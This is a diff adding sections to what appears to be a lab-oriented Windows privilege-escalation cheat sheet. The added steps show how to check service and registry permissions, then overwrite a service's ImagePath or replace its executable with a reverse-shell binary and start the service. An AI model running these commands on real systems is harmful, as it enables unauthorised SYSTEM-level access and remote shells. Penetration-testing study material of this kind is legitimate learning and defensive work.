@@ -103,11 +103,61 @@ copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
 
 - Start the service:
 ```
-net start unquotedsvc
+net start SERVICENAME
+```
+
+### Weak Registry Permissions
+
+- Check permissions of service:
+
+```
+sc qc SERVICENAME
+```
+
+- Check if user has write permissions:
+
+```
+C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\SERVICENAME
+```
+
+- Overwrite the ImagePath registry key to point to the reverse shell:
+
+```
+reg add HKLM\SYSTEM\CurrentControlSet\services\SERVICENAME /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+```
+
+- Start Service:
+
+```
+net start SERVICENAME
+```
+
+### Insecure Service Executables
+
+- Check service privileges:
+
+```
+sc qc SERVICENAME
+```
+
+- Check if user has write permissions:
+
+```
+C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\SERVICENAME.exe"
+```
+
+- Replace the service.exe with the reverse shell:
+
+```
+copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\SERVICENAME.exe" /Y
 ```
 
 
+- Start the service:
 
+```
+net start SERVICENAME
+```
 
 
 
